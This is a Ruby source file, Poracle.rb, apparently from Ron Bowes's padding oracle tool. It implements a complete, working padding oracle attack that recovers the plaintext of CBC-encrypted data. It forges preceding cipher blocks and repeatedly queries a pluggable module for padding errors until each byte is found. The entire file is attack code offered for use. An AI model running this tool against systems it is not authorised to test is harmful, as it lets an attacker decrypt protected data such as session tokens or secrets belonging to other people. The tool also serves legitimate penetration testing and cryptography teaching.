##
# Poracle.rb
# Created: December 8, 2012
# By: Ron Bowes
#
# This class implements a simple Padding Oracle attack. It requires a 'module',
# which implements a couple simple methods:
#
# NAME
#  A constant representing the name of the module, used for output.
#
# blocksize()
#  The blocksize of whatever cipher is being used, in bytes (eg, # 16 for AES,
#  8 for DES, etc)
#
# attempt_decrypt(ciphertext)
#  Attempt to decrypt the given data, and return true if there was no
#  padding error and false if a padding error occured.
#
# character_set() [optional]
#  If character_set() is defined, it is expected to return an array of
#  characters in the order that they're likely to occur in the string. This
#  allows modules to optimize themselves for, for example, filenames. The list
#  doesn't need to be exhaustive; all other possible values are appended from
#  0 to 255.
#
# See LocalTestModule.rb and RemoteTestModule.rb for examples of how this can
# be implemented.
##
#

module Poracle
  attr_accessor :verbose

  @@guesses = 0

  def Poracle.guesses
    return @@guesses
  end

  def Poracle.ord(c)
    if(c.is_a?(Fixnum))
      return c
    end
    return c.unpack('C')[0]
  end

  def Poracle.generate_set(base_list)
    mapping = []
    base_list.each do |i|
      mapping[ord(i)] = true
    end

    0.upto(255) do |i|
      if(!mapping[i])
        base_list << i.chr
      end
    end

    return base_list
  end

  def Poracle.find_character(mod, character, block, previous, plaintext, character_set, verbose = false)
    # First, generate a good C' (C prime) value, which is what we're going to
    # set the previous block to. It's the plaintext we have so far, XORed with
    # the expected padding, XORed with the previous block. This is like the
    # ketchup in the secret sauce.
    blockprime = "\0" * mod.blocksize
    (mod.blocksize - 1).step(character + 1, -1) do |i|
      blockprime[i] = (ord(plaintext[i]) ^ (mod.blocksize - character) ^ ord(previous[i])).chr
    end

    # Try all possible characters in the set (hopefully the set is exhaustive)
    character_set.each do |current_guess|
      # Calculate the next character of C' based on tghe plaintext character we
      # want to guess. This is the mayo in the secret sauce.
      blockprime[character] = ((mod.blocksize - character) ^ ord(previous[character]) ^ ord(current_guess)).chr

      # Ask the mod to attempt to decrypt the string. This is the last
      # ingredient in the secret sauce - the relish, as it were.
      result = mod.attempt_decrypt(blockprime + block)

      # Increment the number of guesses (for reporting/output purposes)
      @@guesses += 1

      # If it successfully decrypted, we found the character!
      if(result)
        # Validate the result if we're working on the last character
        false_positive = false
        if(character == mod.blocksize - 1)
          # Modify the second-last character in any way (we XOR with 1 for
          # simplicity)
          blockprime[character - 1] = (ord(blockprime[character - 1]) ^ 1).chr
          # If the decryption fails, we hit a false positive!
          if(!mod.attempt_decrypt(blockprime + block))
            if(@verbose)
              puts("Hit a false positive!")
            end
            false_positive = true
          end
        end

        # If it's not a false positive, return the character we just found
        if(!false_positive)
          return current_guess
        end
      end
    end

    raise("Couldn't find a valid encoding!")
  end

  def Poracle.do_block(mod, block, previous, has_padding = false, verbose = false)
    # Default result to all question marks - this lets us show it to the user
    # in a pretty way
    result = "?" * block.length

    # It doesn't matter what we default the plaintext to, as long as it's long
    # enough
    plaintext = "\0" * mod.blocksize

    # Loop through the string from the end to the beginning
    (block.length - 1).step(0, -1) do |character|
      # When character is below 0, we've arrived at the beginning of the string
      if(character >= block.length)
        raise("Could not decode!")
      end

      # Try to be intelligent about which character we guess first, to save
      # requests
      set = nil
      if(character == block.length - 1 && has_padding)
        # For the last character of a block with padding, guess the padding
        set = generate_set([1.chr])
      elsif(has_padding && character >= block.length - plaintext[block.length - 1].ord)
        # If we're still in the padding, guess the proper padding value (it's
        # known)
        set = generate_set([plaintext[block.length - 1]])
      elsif(mod.respond_to?(:character_set))
        # If the module provides a character_set, use that
        set = generate_set(mod.character_set)
      else
        # Otherwise, use a common English ordering that I generated based on
        # the Battlestar Galactica wikia page (yes, I'm serious :) )
        set = generate_set(' eationsrlhdcumpfgybw.k:v-/,CT0SA;B#G2xI1PFWE)3(*M\'!LRDHN_"9UO54Vj87q$K6zJY%?Z+=@QX&|[]<>^{}'.chars.to_a)
      end

      # Break the current character (this is the secret sauce)
      c = find_character(mod, character, block, previous, plaintext, set, verbose)
      plaintext[character] = c

      if(verbose)
        puts(plaintext)
      end
    end

    return plaintext
  end

  # This is the public interface. Call this with the mod, data, and optionally
  # the iv, and it'll return the decrypted text or throw an error if it can't.
  # If no IV is given, it's assumed to be NULL (all zeroes).
  def Poracle.decrypt(mod, data, iv = nil, verbose = false)
    # Default to a nil IV
    if(iv.nil?)
      iv = "\x00" * mod.blocksize
    end

    # Add the IV to the start of the encrypted string (for simplicity)
    data  = iv + data
    blockcount = data.length / mod.blocksize

    # Validate the blocksize
    if(data.length % mod.blocksize != 0)
      puts("Encrypted data isn't a multiple of the blocksize! Is this a block cipher?")
    end

    # Tell the user what's going on
    if(verbose)
      puts("> Starting Poracle decrypter with module #{mod.class::NAME}")
      puts(">> Encrypted length: %d" % data.length)
      puts(">> Blocksize: %d" % mod.blocksize)
      puts(">> %d blocks:" % blockcount)
    end

    # Split the data into blocks - using unpack is kinda weird, but it's the
    # best way I could find that isn't Ruby 1.9-specific
    blocks = data.unpack("a#{mod.blocksize}" * blockcount)
    i = 0
    blocks.each do |b|
      i = i + 1
      if(verbose)
        puts(">>> Block #{i}: #{b.unpack("H*")}")
      end
    end

    # Decrypt all the blocks - from the last to the first (after the IV).
    # This can actually be done in any order.
    result = ''
    is_last_block = true
    (blocks.size - 1).step(1, -1) do |i|
      # Process this block - this is where the magic happens
      new_result = do_block(mod, blocks[i], blocks[i - 1], is_last_block, verbose)
      if(new_result.nil?)
        return nil
      end
      is_last_block = false
      result = new_result + result
      if(verbose)
        puts(" --> #{result}")
      end
    end

    # Validate and remove the padding
    pad_bytes = result[result.length - 1].chr
    if(result[result.length - ord(pad_bytes), result.length - 1] != pad_bytes * ord(pad_bytes))
      puts("Bad padding:")
      puts(result.unpack("H*"))
      return nil
    end

    # Remove the padding
    result = result[0, result.length - ord(pad_bytes)]

    return result
  end
end
